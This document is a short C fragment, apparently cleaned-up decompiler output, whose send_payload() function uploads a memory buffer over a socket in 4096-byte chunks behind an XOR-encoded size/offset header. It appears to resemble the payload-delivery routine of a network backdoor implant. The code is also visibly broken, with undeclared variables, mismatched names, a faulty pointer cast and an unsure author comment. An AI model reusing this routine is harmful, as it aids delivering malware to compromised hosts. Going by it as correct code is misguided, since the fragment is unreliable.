int iterations = TotalSizeOfPayload / 4096;
int remainder = TotalSizeOfPayload % 4096;
int v28;
int v14;
int v26;
int v27;

int v12;
int v13;
int v22 = 0;
int i;
int send_payload() {

if ( TotalSizeOfPayload / 4096 > 0 )
    {
      for ( i = 0; ; offset = i )
      {
        *(_QWORD *)&signature = TotalSizeOfPayload;
	*(_QWORD *)&signature[4] = 4096;
        *(_DWORD *)&signature[8] = offset;
        encodePacket(xorkey, signature, 12);
        v29 = *(_QWORD *)v16;
        v30 = *(_DWORD *)&v16[8];
        qmemcpy(&v31, (char *)hMem + offset, 4096);
        if ( send(socket, &buf, 4178, 0) == -1 )
		break;
	if ( buf[34] != 82 )
          break;
	v13 = __OFSUB__(v22 + 1, iterations);
        v12 = v22++ + 1 - iterations < 0;
        i += 4096;
        if ( !(v12 ^ v13) )
          break;
      }
   }

if ( remainder > 0 )
    {
      ImportantValue = htons(remainder + 78);
      v28 = remainder + 13;
      last_offset = iterations << 12;
      v26 = remainder;
      v27 = remainder;
      *(_QWORD *)signature = TotalSizeOfPayload;
      *(_QWORD *)signature[4] = remainder;
      *(_DWORD *)&signature[8] = last_offset; //offset increase ???  idk will check
      encodePacket(xorKey, signature, 12);
      v30 = *(_DWORD *)&signature[8];
      v29 = *(_QWORD *)signature;
      qmemcpy(&v31, (char *)hMem + last_offset, remainder);
      if ( send(s, &buf, remainder + 82, 0) != -1 )
        recv(s, &recvbuff, 4096, 0);
    }
    GlobalFree(hMem);
}
